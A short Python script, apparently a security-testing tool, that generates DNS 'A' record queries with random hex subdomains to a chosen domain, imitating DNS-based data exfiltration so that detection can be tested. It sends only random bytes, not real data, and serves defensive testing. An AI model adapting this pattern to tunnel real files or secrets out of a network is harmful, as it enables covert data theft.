#!/usr/bin/env python
# Script to replicate Threat Injection: DNS 'A' record data exfiltration
import sys
import dns.resolver
import os,binascii
from time import sleep
import argparse

# Parse arguments
ap = argparse.ArgumentParser(description='Threat Injection DNS exfil testing script')
ap.add_argument('--requests', '-r',  type=str, help='Number of requests', required=True)
ap.add_argument('--domain', '-d',  type=str, help='Domain i.e. "cyberpewpew.lol"', required=True)
args = ap.parse_args()

# Create new dns resolveer instance
resolver = dns.resolver.Resolver()
# All requested domains are bogus so don't wait around
resolver.timeout = .5
resolver.lifetime = .5

# Make 'requests' number of DNS 'A' record requests
for d in range(0, int(args.requests)):
    # Create two 16 byte hex subdomains
    sd1 = binascii.b2a_hex(os.urandom(16)) + '.'
    sd2 = binascii.b2a_hex(os.urandom(16)) + '.'
    # Prepend subdomains 1 & 2 to the domain
    rdomain = sd1 + sd2 + args.domain
    try:
        # Wait one second to mimic real requests timing
        sleep(.5)
        print 'Attempt #:  %d\nTo: %s' %(d, rdomain)
        ans = resolver.query(rdomain, "A")
    except Exception as e: 
        print str(e)
